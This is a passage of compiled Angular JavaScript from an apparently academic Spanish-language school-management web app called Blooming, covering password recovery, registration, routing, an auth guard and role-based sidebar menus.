    consts: [["id", "main-wrapper", "data-layout", "vertical", "data-navbarbg", "skin6", "data-sidebartype", "full", "data-sidebar-position", "fixed", "data-header-position", "fixed", 1, "page-wrapper"], [1, "position-relative", "overflow-hidden", "radial-gradient", "min-vh-100", "d-flex", "align-items-center", "justify-content-center"], [1, "d-flex", "align-items-center", "justify-content-center", "w-100"], [1, "row", "justify-content-center", "w-100"], [1, "col-md-8", "col-lg-6", "col-xxl-3"], [1, "card", "mb-0"], [1, "card-body"], ["href", "./index.html", 1, "text-nowrap", "logo-img", "text-center", "d-block", "py-3", "w-100"], ["src", "../assets/images/logos/logo.png", "width", "180", "alt", ""], [1, "text-center"], [1, "mb-3"], ["for", "exampleInputEmail1", 1, "form-label"], ["type", "email", "id", "exampleInputEmail1", "aria-describedby", "emailHelp", 1, "form-control"], ["href", "./index.html", 1, "btn", "btn-primary", "w-100", "py-8", "fs-4", "mb-4", "rounded-2"], ["href", "./login", 1, "btn", "btn-secondary", "w-100", "py-8", "fs-4", "mb-4", "rounded-2"]],
    template: function RecoveryComponent_Template(rf, ctx) {
      if (rf & 1) {
        \u0275\u0275elementStart(0, "div", 0)(1, "div", 1)(2, "div", 2)(3, "div", 3)(4, "div", 4)(5, "div", 5)(6, "div", 6)(7, "a", 7);
        \u0275\u0275element(8, "img", 8);
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(9, "p", 9);
        \u0275\u0275text(10, "\xBFHas olvidado tu contrase\xF1a?");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(11, "p", 9);
        \u0275\u0275text(12, "Escribe tu email abajo y te enviaremos instrucciones de c\xF3mo recuperar tu contrase\xF1a");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(13, "form")(14, "div", 10)(15, "label", 11);
        \u0275\u0275text(16, "Email");
        \u0275\u0275elementEnd();
        \u0275\u0275element(17, "input", 12);
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(18, "a", 13);
        \u0275\u0275text(19, "Aceptar");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(20, "a", 14);
        \u0275\u0275text(21, "Volver");
        \u0275\u0275elementEnd()()()()()()()()();
      }
    },
    dependencies: [\u0275NgNoValidate, NgControlStatusGroup, NgForm],
    styles: ["\n\n/*# sourceMappingURL=data:application/json;base64,ewogICJ2ZXJzaW9uIjogMywKICAic291cmNlcyI6IFtdLAogICJzb3VyY2VzQ29udGVudCI6IFtdLAogICJtYXBwaW5ncyI6ICIiLAogICJuYW1lcyI6IFtdCn0K */"]
  });
  let RecoveryComponent2 = _RecoveryComponent;
  return RecoveryComponent2;
})();

// src/app/auth/registro/registro.component.ts
var import_sweetalert22 = __toESM(require_sweetalert2_all());
function RegistroComponent_p_16_Template(rf, ctx) {
  if (rf & 1) {
    \u0275\u0275elementStart(0, "p", 33);
    \u0275\u0275text(1, "El Nombre es obligatorio");
    \u0275\u0275elementEnd();
  }
}
function RegistroComponent_p_21_Template(rf, ctx) {
  if (rf & 1) {
    \u0275\u0275elementStart(0, "p", 33);
    \u0275\u0275text(1, "El Email es obligatorio");
    \u0275\u0275elementEnd();
  }
}
function RegistroComponent_p_26_Template(rf, ctx) {
  if (rf & 1) {
    \u0275\u0275elementStart(0, "p", 33);
    \u0275\u0275text(1, "La Contrase\xF1a es obligatoria");
    \u0275\u0275elementEnd();
  }
}
function RegistroComponent_p_31_Template(rf, ctx) {
  if (rf & 1) {
    \u0275\u0275elementStart(0, "p", 33);
    \u0275\u0275text(1, "La Calle es obligatoria");
    \u0275\u0275elementEnd();
  }
}
function RegistroComponent_p_36_Template(rf, ctx) {
  if (rf & 1) {
    \u0275\u0275elementStart(0, "p", 33);
    \u0275\u0275text(1, "El C\xF3digo Postal es obligatorio");
    \u0275\u0275elementEnd();
  }
}
function RegistroComponent_p_41_Template(rf, ctx) {
  if (rf & 1) {
    \u0275\u0275elementStart(0, "p", 33);
    \u0275\u0275text(1, "La Localidad es obligatoria");
    \u0275\u0275elementEnd();
  }
}
function RegistroComponent_p_46_Template(rf, ctx) {
  if (rf & 1) {
    \u0275\u0275elementStart(0, "p", 33);
    \u0275\u0275text(1, "La Provincia es obligatoria");
    \u0275\u0275elementEnd();
  }
}
var _c02 = () => ["/inicio"];
var _c12 = () => ["/login"];
var RegistroComponent = /* @__PURE__ */ (() => {
  const _RegistroComponent = class _RegistroComponent {
    constructor(fb, authService, router) {
      this.fb = fb;
      this.authService = authService;
      this.router = router;
      this.sendForm = false;
      this.form = this.fb.group({
        Nombre: ["", [Validators.required]],
        Email: ["", [Validators.required, Validators.email]],
        Contrase\u00F1a: ["", [Validators.required]],
        Calle: ["", [Validators.required]],
        CP: ["", [Validators.required]],
        Localidad: ["", [Validators.required]],
        Provincia: ["", [Validators.required]]
      });
    }
    ngOnInit() {
    }
    registro() {
      this.sendForm = true;
      if (!this.form.valid) {
        console.log("Errores en el formulario");
      } else {
        console.log("registro");
        this.authService.registro(this.form.value).subscribe((response) => {
          console.log("registro!", response);
          this.router.navigate(["centros"]);
        }, (error) => {
          console.error("Error de registro:", error);
          import_sweetalert22.default.fire(error.error.message);
        });
      }
    }
    validarRegistro(campo) {
      return this.form.get(campo)?.valid || !this.sendForm;
    }
  };
  _RegistroComponent.\u0275fac = function RegistroComponent_Factory(t) {
    return new (t || _RegistroComponent)(\u0275\u0275directiveInject(FormBuilder), \u0275\u0275directiveInject(AuthService), \u0275\u0275directiveInject(Router));
  };
  _RegistroComponent.\u0275cmp = /* @__PURE__ */ \u0275\u0275defineComponent({
    type: _RegistroComponent,
    selectors: [["app-registro"]],
    decls: 56,
    vars: 12,
    consts: [["id", "main-wrapper", "data-layout", "vertical", "data-navbarbg", "skin6", "data-sidebartype", "full", "data-sidebar-position", "fixed", "data-header-position", "fixed", 1, "page-wrapper"], [1, "position-relative", "overflow-hidden", "radial-gradient", "min-vh-100", "d-flex", "align-items-center", "justify-content-center"], [1, "d-flex", "align-items-center", "justify-content-center", "w-100"], [1, "row", "justify-content-center", "w-100"], [1, "col-md-8", "col-lg-6", "col-xxl-3"], [1, "card", "mb-0"], [1, "card-body"], ["href", "./index.html", 1, "text-nowrap", "logo-img", "text-center", "d-block", "py-3", "w-100"], ["src", "../assets/images/logos/logo.png", "width", "180", "alt", ""], [1, "text-center"], [3, "formGroup"], [1, "mb-3"], ["for", "Nombre", 1, "form-label"], ["formControlName", "Nombre", "id", "Nombre", 1, "form-control"], ["class", "text-danger", 4, "ngIf"], ["for", "Email", 1, "form-label"], ["type", "email", "formControlName", "Email", 1, "form-control"], [1, "mb-4"], ["for", "Contrase\xF1a", 1, "form-label"], ["type", "password", "formControlName", "Contrase\xF1a", "id", "Contrase\xF1a", 1, "form-control"], ["for", "Calle", 1, "form-label"], ["formControlName", "Calle", "id", "Calle", 1, "form-control"], ["for", "CP", 1, "form-label"], ["formControlName", "CP", "id", "CP", 1, "form-control"], ["for", "Localidad", 1, "form-label"], ["formControlName", "Localidad", "id", "Localidad", 1, "form-control"], ["for", "Provincia", 1, "form-label"], ["formControlName", "Provincia", "id", "Provincia", 1, "form-control"], [1, "btn", "btn-primary", "w-100", "py-8", "fs-4", "mb-4", "rounded-2", 3, "click"], [1, "btn", "btn-secondary", "w-100", "py-8", "fs-4", "mb-4", "rounded-2", 3, "routerLink"], [1, "d-flex", "align-items-center", "justify-content-center"], [1, "fs-4", "mb-0", "fw-bold"], [1, "text-primary", "fw-bold", "ms-2", 3, "routerLink"], [1, "text-danger"]],
    template: function RegistroComponent_Template(rf, ctx) {
      if (rf & 1) {
        \u0275\u0275elementStart(0, "div", 0)(1, "div", 1)(2, "div", 2)(3, "div", 3)(4, "div", 4)(5, "div", 5)(6, "div", 6)(7, "a", 7);
        \u0275\u0275element(8, "img", 8);
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(9, "p", 9);
        \u0275\u0275text(10, "Bienvenido a Blooming");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(11, "form", 10)(12, "div", 11)(13, "label", 12);
        \u0275\u0275text(14, "Nombre");
        \u0275\u0275elementEnd();
        \u0275\u0275element(15, "input", 13);
        \u0275\u0275elementEnd();
        \u0275\u0275template(16, RegistroComponent_p_16_Template, 2, 0, "p", 14);
        \u0275\u0275elementStart(17, "div", 11)(18, "label", 15);
        \u0275\u0275text(19, "Email");
        \u0275\u0275elementEnd();
        \u0275\u0275element(20, "input", 16);
        \u0275\u0275elementEnd();
        \u0275\u0275template(21, RegistroComponent_p_21_Template, 2, 0, "p", 14);
        \u0275\u0275elementStart(22, "div", 17)(23, "label", 18);
        \u0275\u0275text(24, "Contrase\xF1a");
        \u0275\u0275elementEnd();
        \u0275\u0275element(25, "input", 19);
        \u0275\u0275elementEnd();
        \u0275\u0275template(26, RegistroComponent_p_26_Template, 2, 0, "p", 14);
        \u0275\u0275elementStart(27, "div", 17)(28, "label", 20);
        \u0275\u0275text(29, "Calle");
        \u0275\u0275elementEnd();
        \u0275\u0275element(30, "input", 21);
        \u0275\u0275elementEnd();
        \u0275\u0275template(31, RegistroComponent_p_31_Template, 2, 0, "p", 14);
        \u0275\u0275elementStart(32, "div", 17)(33, "label", 22);
        \u0275\u0275text(34, "C\xF3igo Postal");
        \u0275\u0275elementEnd();
        \u0275\u0275element(35, "input", 23);
        \u0275\u0275elementEnd();
        \u0275\u0275template(36, RegistroComponent_p_36_Template, 2, 0, "p", 14);
        \u0275\u0275elementStart(37, "div", 17)(38, "label", 24);
        \u0275\u0275text(39, "Localidad");
        \u0275\u0275elementEnd();
        \u0275\u0275element(40, "input", 25);
        \u0275\u0275elementEnd();
        \u0275\u0275template(41, RegistroComponent_p_41_Template, 2, 0, "p", 14);
        \u0275\u0275elementStart(42, "div", 17)(43, "label", 26);
        \u0275\u0275text(44, "Provincia");
        \u0275\u0275elementEnd();
        \u0275\u0275element(45, "input", 27);
        \u0275\u0275elementEnd();
        \u0275\u0275template(46, RegistroComponent_p_46_Template, 2, 0, "p", 14);
        \u0275\u0275elementStart(47, "button", 28);
        \u0275\u0275listener("click", function RegistroComponent_Template_button_click_47_listener() {
          return ctx.registro();
        });
        \u0275\u0275text(48, "Entrar");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(49, "button", 29);
        \u0275\u0275text(50, "Volver");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(51, "div", 30)(52, "p", 31);
        \u0275\u0275text(53, "\xBFYa tienes una cuenta?");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(54, "a", 32);
        \u0275\u0275text(55, "Inicia sesi\xF3n");
        \u0275\u0275elementEnd()()()()()()()()()();
      }
      if (rf & 2) {
        \u0275\u0275advance(11);
        \u0275\u0275property("formGroup", ctx.form);
        \u0275\u0275advance(5);
        \u0275\u0275property("ngIf", !ctx.validarRegistro("Nombre"));
        \u0275\u0275advance(5);
        \u0275\u0275property("ngIf", !ctx.validarRegistro("Email"));
        \u0275\u0275advance(5);
        \u0275\u0275property("ngIf", !ctx.validarRegistro("Contrase\xF1a"));
        \u0275\u0275advance(5);
        \u0275\u0275property("ngIf", !ctx.validarRegistro("Calle"));
        \u0275\u0275advance(5);
        \u0275\u0275property("ngIf", !ctx.validarRegistro("CP"));
        \u0275\u0275advance(5);
        \u0275\u0275property("ngIf", !ctx.validarRegistro("Localidad"));
        \u0275\u0275advance(5);
        \u0275\u0275property("ngIf", !ctx.validarRegistro("Provincia"));
        \u0275\u0275advance(3);
        \u0275\u0275property("routerLink", \u0275\u0275pureFunction0(10, _c02));
        \u0275\u0275advance(5);
        \u0275\u0275property("routerLink", \u0275\u0275pureFunction0(11, _c12));
      }
    },
    dependencies: [NgIf, RouterLink, \u0275NgNoValidate, DefaultValueAccessor, NgControlStatus, NgControlStatusGroup, FormGroupDirective, FormControlName],
    styles: ["\n\n.form-control2[_ngcontent-%COMP%] {\n  display: block;\n  margin: 0 auto;\n  padding: 8px 16px;\n  font-size: 0.875rem;\n  font-weight: 400;\n  line-height: 1.5;\n  color: #5A6A85;\n  background-color: transparent;\n  background-clip: padding-box;\n  border: var(--bs-border-width) solid #DFE5EF;\n  -webkit-appearance: none;\n  -moz-appearance: none;\n  appearance: none;\n  border-radius: 7px;\n  -webkit-box-shadow: inset 0 1px 2px rgba(var(--bs-body-color-rgb), 0.075);\n  box-shadow: inset 0 1px 2px rgba(var(--bs-body-color-rgb), 0.075);\n  -webkit-transition: border-color 0.15s ease-in-out, -webkit-box-shadow 0.15s ease-in-out;\n  transition: border-color 0.15s ease-in-out, -webkit-box-shadow 0.15s ease-in-out;\n  transition: border-color 0.15s ease-in-out, box-shadow 0.15s ease-in-out;\n  transition:\n    border-color 0.15s ease-in-out,\n    box-shadow 0.15s ease-in-out,\n    -webkit-box-shadow 0.15s ease-in-out;\n}\n.espacioIzq[_ngcontent-%COMP%] {\n  margin-left: 3.7em;\n}\n.espacioDcha[_ngcontent-%COMP%] {\n  margin-right: .5em;\n}\n/*# sourceMappingURL=data:application/json;base64,ewogICJ2ZXJzaW9uIjogMywKICAic291cmNlcyI6IFsic3JjL2FwcC9hdXRoL3JlZ2lzdHJvL3JlZ2lzdHJvLmNvbXBvbmVudC5jc3MiXSwKICAic291cmNlc0NvbnRlbnQiOiBbIi5mb3JtLWNvbnRyb2wyIHtcclxuICAgIGRpc3BsYXk6IGJsb2NrO1xyXG4gICAgbWFyZ2luOiAwIGF1dG87XHJcbiAgICBwYWRkaW5nOiA4cHggMTZweDtcclxuICAgIGZvbnQtc2l6ZTogMC44NzVyZW07XHJcbiAgICBmb250LXdlaWdodDogNDAwO1xyXG4gICAgbGluZS1oZWlnaHQ6IDEuNTtcclxuICAgIGNvbG9yOiAjNUE2QTg1O1xyXG4gICAgYmFja2dyb3VuZC1jb2xvcjogdHJhbnNwYXJlbnQ7XHJcbiAgICBiYWNrZ3JvdW5kLWNsaXA6IHBhZGRpbmctYm94O1xyXG4gICAgYm9yZGVyOiB2YXIoLS1icy1ib3JkZXItd2lkdGgpIHNvbGlkICNERkU1RUY7XHJcbiAgICAtd2Via2l0LWFwcGVhcmFuY2U6IG5vbmU7XHJcbiAgICAtbW96LWFwcGVhcmFuY2U6IG5vbmU7XHJcbiAgICBhcHBlYXJhbmNlOiBub25lO1xyXG4gICAgYm9yZGVyLXJhZGl1czogN3B4O1xyXG4gICAgLXdlYmtpdC1ib3gtc2hhZG93OiBpbnNldCAwIDFweCAycHggcmdiYSh2YXIoLS1icy1ib2R5LWNvbG9yLXJnYiksMC4wNzUpO1xyXG4gICAgYm94LXNoYWRvdzogaW5zZXQgMCAxcHggMnB4IHJnYmEodmFyKC0tYnMtYm9keS1jb2xvci1yZ2IpLDAuMDc1KTtcclxuICAgIC13ZWJraXQtdHJhbnNpdGlvbjogYm9yZGVyLWNvbG9yIDAuMTVzIGVhc2UtaW4tb3V0LC13ZWJraXQtYm94LXNoYWRvdyAwLjE1cyBlYXNlLWluLW91dDtcclxuICAgIHRyYW5zaXRpb246IGJvcmRlci1jb2xvciAwLjE1cyBlYXNlLWluLW91dCwtd2Via2l0LWJveC1zaGFkb3cgMC4xNXMgZWFzZS1pbi1vdXQ7XHJcbiAgICB0cmFuc2l0aW9uOiBib3JkZXItY29sb3IgMC4xNXMgZWFzZS1pbi1vdXQsYm94LXNoYWRvdyAwLjE1cyBlYXNlLWluLW91dDtcclxuICAgIHRyYW5zaXRpb246IGJvcmRlci1jb2xvciAwLjE1cyBlYXNlLWluLW91dCxib3gtc2hhZG93IDAuMTVzIGVhc2UtaW4tb3V0LC13ZWJraXQtYm94LXNoYWRvdyAwLjE1cyBlYXNlLWluLW91dDtcclxufVxyXG4uZXNwYWNpb0l6cXtcclxuICAgIG1hcmdpbi1sZWZ0OiAzLjdlbTtcclxufVxyXG4uZXNwYWNpb0RjaGF7XHJcbiAgICBtYXJnaW4tcmlnaHQ6IC41ZW07XHJcbn0iXSwKICAibWFwcGluZ3MiOiAiO0FBQUEsQ0FBQztBQUNHLFdBQVM7QUFDVCxVQUFRLEVBQUU7QUFDVixXQUFTLElBQUk7QUFDYixhQUFXO0FBQ1gsZUFBYTtBQUNiLGVBQWE7QUFDYixTQUFPO0FBQ1Asb0JBQWtCO0FBQ2xCLG1CQUFpQjtBQUNqQixVQUFRLElBQUksbUJBQW1CLE1BQU07QUFDckMsc0JBQW9CO0FBQ3BCLG1CQUFpQjtBQUNqQixjQUFZO0FBQ1osaUJBQWU7QUFDZixzQkFBb0IsTUFBTSxFQUFFLElBQUksSUFBSSxLQUFLLElBQUksb0JBQW9CLEVBQUM7QUFDbEUsY0FBWSxNQUFNLEVBQUUsSUFBSSxJQUFJLEtBQUssSUFBSSxvQkFBb0IsRUFBQztBQUMxRCxzQkFBb0IsYUFBYSxNQUFNLFdBQVcsRUFBQyxtQkFBbUIsTUFBTTtBQUM1RSxjQUFZLGFBQWEsTUFBTSxXQUFXLEVBQUMsbUJBQW1CLE1BQU07QUFDcEUsY0FBWSxhQUFhLE1BQU0sV0FBVyxFQUFDLFdBQVcsTUFBTTtBQUM1RDtBQUFBLElBQVksYUFBYSxNQUFNLFdBQVc7QUFBQSxJQUFDLFdBQVcsTUFBTSxXQUFXO0FBQUEsSUFBQyxtQkFBbUIsTUFBTTtBQUNyRztBQUNBLENBQUM7QUFDRyxlQUFhO0FBQ2pCO0FBQ0EsQ0FBQztBQUNHLGdCQUFjO0FBQ2xCOyIsCiAgIm5hbWVzIjogW10KfQo= */"]
  });
  let RegistroComponent2 = _RegistroComponent;
  return RegistroComponent2;
})();

// src/app/auth/inicio/inicio.component.ts
var InicioComponent = /* @__PURE__ */ (() => {
  const _InicioComponent = class _InicioComponent {
  };
  _InicioComponent.\u0275fac = function InicioComponent_Factory(t) {
    return new (t || _InicioComponent)();
  };
  _InicioComponent.\u0275cmp = /* @__PURE__ */ \u0275\u0275defineComponent({
    type: _InicioComponent,
    selectors: [["app-inicio"]],
    decls: 17,
    vars: 0,
    consts: [["id", "main-wrapper", "data-layout", "vertical", "data-navbarbg", "skin6", "data-sidebartype", "full", "data-sidebar-position", "fixed", "data-header-position", "fixed", 1, "page-wrapper"], [1, "position-relative", "overflow-hidden", "radial-gradient", "min-vh-100", "d-flex", "align-items-center", "justify-content-center"], [1, "d-flex", "align-items-center", "justify-content-center", "w-100"], [1, "row", "justify-content-center", "w-100"], [1, "col-md-8", "col-lg-6", "col-xxl-3"], [1, "card", "mb-0"], [1, "card-body"], ["href", "./index.html", 1, "text-nowrap", "logo-img", "text-center", "d-block", "py-3", "w-100"], ["src", "../assets/images/logos/logo.png", "width", "180", "alt", ""], [1, "text-center"], ["href", "./login", 1, "btn", "btn-primary", "w-100", "py-8", "fs-4", "mb-4", "rounded-2"], ["href", "./registro", 1, "btn", "btn-primary", "w-100", "py-8", "fs-4", "mb-4", "rounded-2"]],
    template: function InicioComponent_Template(rf, ctx) {
      if (rf & 1) {
        \u0275\u0275elementStart(0, "div", 0)(1, "div", 1)(2, "div", 2)(3, "div", 3)(4, "div", 4)(5, "div", 5)(6, "div", 6)(7, "a", 7);
        \u0275\u0275element(8, "img", 8);
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(9, "p", 9);
        \u0275\u0275text(10, "Bienvenido de nuevo");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(11, "a", 10);
        \u0275\u0275text(12, "Inicia Sesi\xF3n");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(13, "p", 9);
        \u0275\u0275text(14, "\xBFEres nuevo? Registra tu centro clicando en el bot\xF3n de abajo");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(15, "a", 11);
        \u0275\u0275text(16, "Reg\xEDstrate");
        \u0275\u0275elementEnd()()()()()()()();
      }
    },
    styles: ["\n\n/*# sourceMappingURL=data:application/json;base64,ewogICJ2ZXJzaW9uIjogMywKICAic291cmNlcyI6IFtdLAogICJzb3VyY2VzQ29udGVudCI6IFtdLAogICJtYXBwaW5ncyI6ICIiLAogICJuYW1lcyI6IFtdCn0K */"]
  });
  let InicioComponent2 = _InicioComponent;
  return InicioComponent2;
})();

// src/app/auth/auth.routing.ts
var routes = [{
  path: "login",
  component: AuthLayoutComponent,
  children: [{
    path: "",
    component: LoginComponent
  }, {
    path: "**",
    redirectTo: ""
  }]
}, {
  path: "recovery",
  component: AuthLayoutComponent,
  children: [{
    path: "",
    component: RecoveryComponent
  }, {
    path: "**",
    redirectTo: ""
  }]
}, {
  path: "registro",
  component: AuthLayoutComponent,
  children: [{
    path: "",
    component: RegistroComponent
  }, {
    path: "**",
    redirectTo: ""
  }]
}, {
  path: "inicio",
  component: AuthLayoutComponent,
  children: [{
    path: "",
    component: InicioComponent
  }, {
    path: "**",
    redirectTo: ""
  }]
}];
var AuthRoutingModule = /* @__PURE__ */ (() => {
  const _AuthRoutingModule = class _AuthRoutingModule {
  };
  _AuthRoutingModule.\u0275fac = function AuthRoutingModule_Factory(t) {
    return new (t || _AuthRoutingModule)();
  };
  _AuthRoutingModule.\u0275mod = /* @__PURE__ */ \u0275\u0275defineNgModule({
    type: _AuthRoutingModule
  });
  _AuthRoutingModule.\u0275inj = /* @__PURE__ */ \u0275\u0275defineInjector({
    imports: [RouterModule.forChild(routes), RouterModule]
  });
  let AuthRoutingModule2 = _AuthRoutingModule;
  return AuthRoutingModule2;
})();

// src/app/guards/auth.guard.ts
var AuthGuard = /* @__PURE__ */ (() => {
  const _AuthGuard = class _AuthGuard {
    constructor(authService, router) {
      this.authService = authService;
      this.router = router;
    }
    canActivate(next, state) {
      return this.authService.validarToken().pipe(tap((resp) => {
        if (!resp) {
          this.router.navigateByUrl("/login");
        }
      }));
    }
  };
  _AuthGuard.\u0275fac = function AuthGuard_Factory(t) {
    return new (t || _AuthGuard)(\u0275\u0275inject(AuthService), \u0275\u0275inject(Router));
  };
  _AuthGuard.\u0275prov = /* @__PURE__ */ \u0275\u0275defineInjectable({
    token: _AuthGuard,
    factory: _AuthGuard.\u0275fac,
    providedIn: "root"
  });
  let AuthGuard2 = _AuthGuard;
  return AuthGuard2;
})();

// src/app/pages/centros/centros.component.ts
var CentrosComponent = /* @__PURE__ */ (() => {
  const _CentrosComponent = class _CentrosComponent {
  };
  _CentrosComponent.\u0275fac = function CentrosComponent_Factory(t) {
    return new (t || _CentrosComponent)();
  };
  _CentrosComponent.\u0275cmp = /* @__PURE__ */ \u0275\u0275defineComponent({
    type: _CentrosComponent,
    selectors: [["app-centros"]],
    decls: 20,
    vars: 0,
    consts: [["id", "main-wrapper", "data-layout", "vertical", "data-navbarbg", "skin6", "data-sidebartype", "full", "data-sidebar-position", "fixed", "data-header-position", "fixed", 1, "page-wrapper"], [1, "body-wrapper", 2, "margin-left", "0"], [1, "container-fluid"], [1, "card"], [1, "card-body", "text-center"], [1, "card-title", "fw-semibold", "mb-4"], [1, "card-body", "d-flex", "flex-column", "justify-content-center"], ["href", "/centros/ver-profesores", 1, "btn", "btn-outline-secondary", "btn-custom"], ["href", "/centros/ver-alumnos", 1, "btn", "btn-outline-secondary", "btn-custom"], ["href", "/centros/ver-clases", 1, "btn", "btn-outline-secondary", "btn-custom"], [1, "py-6", "px-6", "text-center"], [1, "copyright"]],
    template: function CentrosComponent_Template(rf, ctx) {
      if (rf & 1) {
        \u0275\u0275elementStart(0, "div", 0)(1, "div", 1)(2, "div", 2)(3, "div", 2)(4, "div", 2)(5, "div", 3)(6, "div", 4)(7, "h5", 5);
        \u0275\u0275text(8, "Bienvenido de nuevo");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(9, "div", 3)(10, "div", 6)(11, "a", 7);
        \u0275\u0275text(12, "Profesores");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(13, "a", 8);
        \u0275\u0275text(14, "Alumnos");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(15, "a", 9);
        \u0275\u0275text(16, "Clases");
        \u0275\u0275elementEnd()()()()()()();
        \u0275\u0275elementStart(17, "div", 10)(18, "p", 11);
        \u0275\u0275text(19, "\xA9 2023 Blooming. Proyecto acad\xE9mico de la Universidad de Alicante .");
        \u0275\u0275elementEnd()()()()();
      }
    },
    styles: ["\n\n.btn-custom[_ngcontent-%COMP%] {\n  width: 200px;\n  margin-left: auto;\n  margin-right: auto;\n  margin-top: 20px;\n}\n/*# sourceMappingURL=data:application/json;base64,ewogICJ2ZXJzaW9uIjogMywKICAic291cmNlcyI6IFsic3JjL2FwcC9wYWdlcy9jZW50cm9zL2NlbnRyb3MuY29tcG9uZW50LmNzcyJdLAogICJzb3VyY2VzQ29udGVudCI6IFsiXHJcbi5idG4tY3VzdG9tIHtcclxuICAgIHdpZHRoOiAyMDBweDsgXHJcbiAgICBtYXJnaW4tbGVmdDogYXV0bztcclxuICAgIG1hcmdpbi1yaWdodDogYXV0bztcclxuICAgIG1hcmdpbi10b3A6IDIwcHg7XHJcbn1cclxuIl0sCiAgIm1hcHBpbmdzIjogIjtBQUNBLENBQUM7QUFDRyxTQUFPO0FBQ1AsZUFBYTtBQUNiLGdCQUFjO0FBQ2QsY0FBWTtBQUNoQjsiLAogICJuYW1lcyI6IFtdCn0K */"]
  });
  let CentrosComponent2 = _CentrosComponent;
  return CentrosComponent2;
})();

// src/app/services/sidebar.service.ts
var SidebarService = /* @__PURE__ */ (() => {
  const _SidebarService = class _SidebarService {
    constructor() {
      this.menuAdmin = [{
        titulo: "Centros",
        icono: "ti ti-home",
        url: "/admin/ver-centros"
      }, {
        titulo: "Profesores",
        icono: "ti ti-users",
        url: "/admin/ver-profesores"
      }, {
        titulo: "Alumnos",
        icono: "ti ti-friends",
        url: "/admin/ver-alumnos"
      }, {
        titulo: "Clases",
        icono: "ti ti-school",
        url: "/admin/ver-clases"
      }];
      this.menuAlumno = [];
      this.menuProfesor = [{
        titulo: "Alumnos",
        icono: "ti ti-friends",
        url: "/profesores/ver-alumnos"
      }, {
        titulo: "Clases",
        icono: "ti ti-school",
        url: "/profesores/ver-clases"
      }];
      this.menuCentro = [{
        titulo: "Profesores",
        icono: "ti ti-users",
        url: "/centros/ver-profesores"
      }, {
        titulo: "Alumnos",
        icono: "ti ti-friends",
        url: "/centros/ver-alumnos"
      }, {
        titulo: "Clases",
        icono: "ti ti-school",
        url: "/centros/ver-clases"
      }];
    }
    getmenu() {
      const rol = localStorage.getItem("rol");
      switch (rol) {
        case "Admin":
          return this.menuAdmin;
        case "Profesor":
          return this.menuProfesor;
        case "Alumno":
          return this.menuAlumno;
        case "Centro":
          return this.menuCentro;
      }
      return [];
    }
  };
  _SidebarService.\u0275fac = function SidebarService_Factory(t) {
    return new (t || _SidebarService)();
  };
  _SidebarService.\u0275prov = /* @__PURE__ */ \u0275\u0275defineInjectable({
    token: _SidebarService,
    factory: _SidebarService.\u0275fac,
    providedIn: "root"
  });
  let SidebarService2 = _SidebarService;
  return SidebarService2;
})();

// src/app/commons/sidebar/sidebar.component.ts
function SidebarComponent_li_15_Template(rf, ctx) {
  if (rf & 1) {
    \u0275\u0275elementStart(0, "li", 12)(1, "a", 13)(2, "span");
    \u0275\u0275element(3, "i");
    \u0275\u0275elementEnd();
    \u0275\u0275elementStart(4, "span", 10);
    \u0275\u0275text(5);
    \u0275\u0275elementEnd()()();
  }
  if (rf & 2) {
    const item_r1 = ctx.$implicit;
    \u0275\u0275advance(1);
    \u0275\u0275property("routerLink", item_r1.url);
    \u0275\u0275advance(2);
    \u0275\u0275classMap(item_r1.icono);
    \u0275\u0275advance(2);
    \u0275\u0275textInterpolate(item_r1.titulo);
  }
}
var SidebarComponent = /* @__PURE__ */ (() => {
  const _SidebarComponent = class _SidebarComponent {
    constructor(sidebar) {
      this.sidebar = sidebar;
      this.menu = [];
    }
    ngOnInit() {
      this.menu = this.sidebar.getmenu();
      console.log(this.menu);
    }
  };
  _SidebarComponent.\u0275fac = function SidebarComponent_Factory(t) {
    return new (t || _SidebarComponent)(\u0275\u0275directiveInject(SidebarService));
  };
  _SidebarComponent.\u0275cmp = /* @__PURE__ */ \u0275\u0275defineComponent({
    type: _SidebarComponent,
    selectors: [["app-sidebar"]],
    decls: 16,
    vars: 1,
    consts: [[1, "left-sidebar"], [1, "brand-logo", "d-flex", "align-items-center", "justify-content-between"], ["href", "./admin/admindashboard", 1, "text-nowrap", "logo-img"], ["src", "../assets/images/logos/logo.png", "width", "180", "alt", ""], ["id", "sidebarCollapse", 1, "close-btn", "d-xl-none", "d-block", "sidebartoggler", "cursor-pointer"], [1, "ti", "ti-x", "fs-8"], ["data-simplebar", "", 1, "sidebar-nav", "scroll-sidebar"], ["id", "sidebarnav"], [1, "nav-small-cap"], [1, "ti", "ti-dots", "nav-small-cap-icon", "fs-4"], [1, "hide-menu"], ["class", "sidebar-item", 4, "ngFor", "ngForOf"], [1, "sidebar-item"], ["aria-expanded", "false", 1, "sidebar-link", 3, "routerLink"]],
    template: function SidebarComponent_Template(rf, ctx) {
      if (rf & 1) {
        \u0275\u0275elementStart(0, "aside", 0)(1, "div")(2, "div", 1)(3, "a", 2);
        \u0275\u0275element(4, "br")(5, "img", 3);
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(6, "div", 4);
        \u0275\u0275element(7, "i", 5);
        \u0275\u0275elementEnd()();
        \u0275\u0275elementStart(8, "nav", 6);
        \u0275\u0275element(9, "br");
        \u0275\u0275elementStart(10, "ul", 7)(11, "li", 8);
        \u0275\u0275element(12, "i", 9);
        \u0275\u0275elementStart(13, "span", 10);
        \u0275\u0275text(14, "Home");
        \u0275\u0275elementEnd()();
        \u0275\u0275template(15, SidebarComponent_li_15_Template, 6, 5, "li", 11);
        \u0275\u0275elementEnd()()()();
      }
      if (rf & 2) {
        \u0275\u0275advance(15);
        \u0275\u0275property("ngForOf", ctx.menu);
      }
    },
